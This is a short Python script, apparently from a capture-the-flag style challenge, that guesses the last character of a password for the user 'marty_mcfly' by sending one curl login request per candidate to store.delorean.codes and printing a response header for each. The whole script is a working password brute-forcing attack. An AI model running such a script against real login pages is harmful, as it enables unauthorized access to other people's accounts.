#!/usr/bin/env python
# pylint:disable=missing-docstring,invalid-name

import subprocess
import urllib

def main():
    for ch in list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'):
        pwd = '2H5igrW7G%s' % ch

        url = 'https://store.delorean.codes/u/MathSquared/login'

        query = urllib.urlencode({
            'username': 'marty_mcfly',
            'password': pwd,
        })

        cmd = ['curl']
        #cmd.extend(['-o', '/dev/null'])  # bitbucket
        cmd.extend(['-i'])  # response headers
        cmd.extend(['-X', 'POST'])  # method
        cmd.extend(['-H', 'Content-Type: application/x-www-form-urlencoded'])
        cmd.extend(['-d', query, url])

        pipe = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = pipe.communicate()

        print '%s -> %s' % (ch, [x.split()[1] for x in out.splitlines() if 'Upstream' in x][0])

if __name__ == '__main__':
    main()
